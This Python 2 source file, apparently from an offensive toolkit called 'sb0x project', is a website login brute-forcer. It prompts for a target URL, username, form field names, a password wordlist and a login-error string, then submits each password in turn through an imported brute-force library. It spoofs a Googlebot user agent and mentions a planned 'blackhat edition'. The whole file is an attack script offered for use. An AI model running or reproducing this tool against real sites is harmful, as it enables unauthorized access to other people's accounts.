"""
test_site.py - post method Brute force
authot: levi0x0
Copyright (c) 2013-201x sb0x project

See the file LICENSE
"""

import lib.lib_test as btest #import wordpress brute force lib as wptest
import sys
import urllib2
import re
import threading

version = '0.1alp'
def main():
	try:
		print "--Web site brute force %s--" % (version)
		print "GPLv3"
		target = raw_input("\n* Target:") #get target
		#test target
		if not "://" in target:
			print "[-] http:// requierd.."
			sys.exit()
		else:
			pass
		user = raw_input("* User:")
		p_t = raw_input("* User tag:")
		u_t = raw_input("* Password tag:")
		wl = raw_input("* Wordlist (Default):") or "wordlist/password.lst"
		log_err = raw_input("* Login error:")

		#proxy setting
		ask_for_proxy = False #in deve until version 1.0.6-rc blackhat edition
		if ask_for_proxy == "y" or ask_for_proxy == "Y":
			proxy = True
			proxy_server = raw_input("* Proxy IP:")
			proxy_port = int(raw_input("* Proxy PORT:"))

		else:
			proxy = False
			proxy_server = None
			proxy_port = 8080

		user_agent = ["Mozilla/5.0 (Google bot http://google.com/bot.html)"]

		verbose = False
		passwords = open(wl).readlines()
		print "[*] Start Attack... good luck!..."
		
		for passw in passwords:
			tags = {u_t : user, p_t :  passw,}
			start = btest.brute_force(target, tags, user, passw.replace("\n", ""), proxy, proxy_server, proxy_port, user_agent,verbose, log_err)
			start.run()

	except KeyboardInterrupt:
		print "\nCtrl-C was pressed"
		sys.exit(0)
	except (urllib2.URLError):
		print "\n[-] conection faild or check your internet setting."
		sys.exit(1)
		
	except IOError:
		print "\n[-]No such file or directory"
		sys.exit(1)

